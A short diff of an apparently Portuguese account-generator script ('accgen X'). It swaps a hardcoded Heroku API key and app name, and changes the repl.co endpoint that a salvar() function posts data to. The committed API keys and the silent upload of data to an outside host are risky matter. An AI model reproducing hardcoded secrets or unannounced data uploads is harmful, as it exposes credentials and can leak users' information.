@@ -14,8 +14,8 @@ import heroku3
 abertura = figlet_format("a c c g e n  X\n       p t - b r")
 print(abertura)
 
-key_api_heroku = "6d8f245a-c79c-435d-9ef9-63952e1188d4"
-nome_aplicativo = "zeus666"
+key_api_heroku = "f9ae5488-dab5-49fc-ba83-fac48fbb11d6"
+nome_aplicativo = "accgenx"
 
 
 # ===============Funções==================
@@ -67,7 +67,7 @@ def encurtar_link(link):
 
 
 def salvar(data):
-    requests.post("https://SALVACP.bakihanma3.repl.co/save", data=data)
+    requests.post("https://Accgen.ghosthanma.repl.co/save", data=data)
 
 
 # ==================Gerador=============================
